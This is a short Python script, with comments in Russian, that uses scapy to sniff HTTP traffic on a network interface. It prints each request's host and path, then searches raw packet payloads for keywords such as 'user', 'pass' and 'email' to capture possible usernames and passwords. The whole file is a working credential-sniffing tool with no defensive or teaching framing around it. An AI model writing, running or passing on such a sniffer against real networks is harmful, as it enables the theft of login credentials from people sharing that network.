import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface,store=False,prn=process_sniffed_packet) #Какой интерфейс снифать

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path  # Узнать url, где введен логин и пароль


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):  # Проверка уровня  (используется для передачи паролей и логинов)
        load = packet[scapy.Raw].load  # уровень Raw и load   поле
        keywords = ["user", "username", "login", "pass", "password", "e-mail", "email"]
        for keyword in keywords:
            if keyword in str(load):
                return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest): #Проверка есть ли http
        url = get_url(packet)
        print("[+] HTTP Request >> " + str(url))

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password >> " + str(login_info) + "\n\n")


sniff("en0")